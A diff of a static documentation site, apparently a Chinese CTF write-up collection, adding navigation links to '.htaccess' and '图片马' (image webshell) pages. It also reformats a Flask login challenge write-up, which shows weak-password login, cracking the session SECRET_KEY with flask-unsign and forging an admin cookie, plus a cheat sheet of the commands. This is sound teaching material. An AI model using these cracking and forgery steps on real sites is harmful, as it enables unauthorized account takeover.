@@ -1781,6 +1781,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -1828,6 +1832,36 @@
 
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../htaccess/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    .htaccess
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2228,6 +2262,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../%E5%9B%BE%E7%89%87%E9%A9%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    图片马
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E4%BB%BB/" class="md-nav__link">
         
   
@@ -2576,20 +2640,20 @@ Firefox：存储 → Cookie</p>
 </div>
 <h3 id="cookie"><a class="toclink" href="../../flasklogin/#cookie">看 Cookie</a></h3>
 <p>看到 <code>session</code> 的值是：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88
 </span></code></pre></div>
 <p><strong>注意：只有第一段是 base64，整条不是。</strong></p>
 <p>把第一段 <code>eyJ1c2VyIjoiZ3Vlc3QifQ</code> 拿去 base64 解码：</p>
-<div class="language-json highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="p">{</span><span class="nt">"user"</span><span class="p">:</span><span class="s2">"guest"</span><span class="p">}</span>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">{</span><span class="nt">"user"</span><span class="p">:</span><span class="s2">"guest"</span><span class="p">}</span>
 </span></code></pre></div>
 <p>得到身份就是这一小段 JSON。</p>
 <h3 id="_2"><a class="toclink" href="../../flasklogin/#_2">认出格式</a></h3>
 <p>整条值长这样：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>eyJ1c2VyIjoiZ3Vlc3QifQ . atybFQ . 0due7kkk3LdRwoQPSckRCSMWv88
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>└───── 数据 ─────┘    └时间戳┘  └──────── HMAC 签名 ────────┘
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>eyJ1c2VyIjoiZ3Vlc3QifQ . atybFQ . 0due7kkk3LdRwoQPSckRCSMWv88
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>└───── 数据 ─────┘    └时间戳┘  └──────── HMAC 签名 ────────┘
 </span></code></pre></div>
 <p><strong>这是 Flask 默认的签名 session 格式：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>base64(JSON) . base64(时间戳) . base64(HMAC-SHA1)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>base64(JSON) . base64(时间戳) . base64(HMAC-SHA1)
 </span></code></pre></div>
 <p><strong>签名是拿 <code>SECRET_KEY</code> 对整个 <code>数据.时间戳</code> 算出来的。</strong></p>
 <h3 id="user-admin"><a class="toclink" href="../../flasklogin/#user-admin">直接改 user 为 admin？不行</a></h3>
@@ -2598,19 +2662,19 @@ Firefox：存储 → Cookie</p>
 <p><strong>所以要改身份，必须先拿到 <code>SECRET_KEY</code>，自己重新签一个。</strong></p>
 <h3 id="secret_key"><a class="toclink" href="../../flasklogin/#secret_key">找 SECRET_KEY</a></h3>
 <p>先用 flask 工具爆破字典：</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">flask-unsign</span> <span class="n">-i</span> <span class="n">https</span><span class="p">://</span><span class="n">pypi</span><span class="p">.</span><span class="n">tuna</span><span class="p">.</span><span class="n">tsinghua</span><span class="p">.</span><span class="n">edu</span><span class="p">.</span><span class="n">cn</span><span class="p">/</span><span class="n">simple</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="s1">'secret'</span><span class="p">,</span><span class="s1">'dev'</span><span class="p">,</span><span class="s1">'changeme'</span><span class="p">,</span><span class="s1">'ctf2026'</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
-</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88"</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">flask-unsign</span> <span class="n">-i</span> <span class="n">https</span><span class="p">://</span><span class="n">pypi</span><span class="p">.</span><span class="n">tuna</span><span class="p">.</span><span class="n">tsinghua</span><span class="p">.</span><span class="n">edu</span><span class="p">.</span><span class="n">cn</span><span class="p">/</span><span class="n">simple</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="s1">'secret'</span><span class="p">,</span><span class="s1">'dev'</span><span class="p">,</span><span class="s1">'changeme'</span><span class="p">,</span><span class="s1">'ctf2026'</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88"</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
 </span></code></pre></div>
 <p><strong>同时注意到页面上的 <code>ctf2026</code>（登录页标题 <code>🔑 ctf2026</code>）—— 拿它当 secret 一试就中。</strong></p>
 <h3 id="_3"><a class="toclink" href="../../flasklogin/#_3">重新签名</a></h3>
 <p><img alt="重新签名" src="../../../assets/images/flasklogin/03-sign.png" /></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'user': 'admin'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="n">ctf2026</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'user': 'admin'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="n">ctf2026</span>
 </span></code></pre></div>
 <p><strong>注意 <code>--cookie</code> 用的是 <strong>Python 字典语法</strong>（单引号），不是 JSON。</strong></p>
 <p>输出一条新的：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>eyJ1c2VyIjoiYWRtaW4ifQ.atyPOw.5-D0uOFDLKt18mszGkl5W9CVBGE
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>eyJ1c2VyIjoiYWRtaW4ifQ.atyPOw.5-D0uOFDLKt18mszGkl5W9CVBGE
 </span></code></pre></div>
 <p><strong>把它整个替换掉 Cookie 里的 <code>session</code> 值，刷新。</strong></p>
 <div class="admonition warning">
@@ -2620,17 +2684,17 @@ Firefox：存储 → Cookie</p>
 </div>
 <h3 id="flag"><a class="toclink" href="../../flasklogin/#flag">拿到 flag</a></h3>
 <p><img alt="Welcome admin" src="../../../assets/images/flasklogin/04-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>flag{fl4sk_s3ss10n_1s_n07_s3cur3}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>flag{fl4sk_s3ss10n_1s_n07_s3cur3}
 </span></code></pre></div>
 <h3 id="_4"><a class="toclink" href="../../flasklogin/#_4">这题的完整链路</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>① 弱口令登录        guest / guest123
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>② 观察 session      eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.xxx
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>③ 解码第一段        {"user":"guest"}
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>④ 认出格式          base64(数据) . 时间戳 . HMAC 签名   ← Flask
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>⑤ 直接改内容        ❌ 302（签名校验失败）
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>⑥ 找 SECRET_KEY     页面标题 ctf2026 / flask-unsign 爆破
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>⑦ 自己重新签名      flask-unsign --sign --cookie "{'user':'admin'}" --secret ctf2026
-</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>⑧ 替换整条 Cookie   → 👑 Welcome, admin → flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>① 弱口令登录        guest / guest123
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>② 观察 session      eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.xxx
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>③ 解码第一段        {"user":"guest"}
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>④ 认出格式          base64(数据) . 时间戳 . HMAC 签名   ← Flask
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>⑤ 直接改内容        ❌ 302（签名校验失败）
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>⑥ 找 SECRET_KEY     页面标题 ctf2026 / flask-unsign 爆破
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>⑦ 自己重新签名      flask-unsign --sign --cookie "{'user':'admin'}" --secret ctf2026
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>⑧ 替换整条 Cookie   → 👑 Welcome, admin → flag
 </span></code></pre></div>
 <h3 id="_5"><a class="toclink" href="../../flasklogin/#_5">知识点</a></h3>
 <p><strong>这题的核心是区分两件事：</strong></p>
@@ -2654,17 +2718,17 @@ Firefox：存储 → Cookie</p>
 </table>
 <p><strong>Flask 的 session 属于第二种 —— 默认用 <code>SECRET_KEY</code> 做 HMAC-SHA1 签名。</strong></p>
 <p><strong>所以「Flask 站点 + session cookie」这个组合，标准套路就是：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>先试着解码 → 认出 .时间戳.签名 三段式 → 上 flask-unsign
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>先试着解码 → 认出 .时间戳.签名 三段式 → 上 flask-unsign
 </span></code></pre></div>
 <h3 id="_6"><a class="toclink" href="../../flasklogin/#_6">工具备忘</a></h3>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c"># 只看内容,不需要密钥</span>
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-decode</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ..."</span>
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="c"># 爆破密钥</span>
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ..."</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
-</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>
-</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="c"># 用已知密钥伪造</span>
-</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'user':'admin'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="n">ctf2026</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># 只看内容,不需要密钥</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-decode</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ..."</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c"># 爆破密钥</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ..."</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="c"># 用已知密钥伪造</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'user':'admin'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="n">ctf2026</span>
 </span></code></pre></div>
     
     
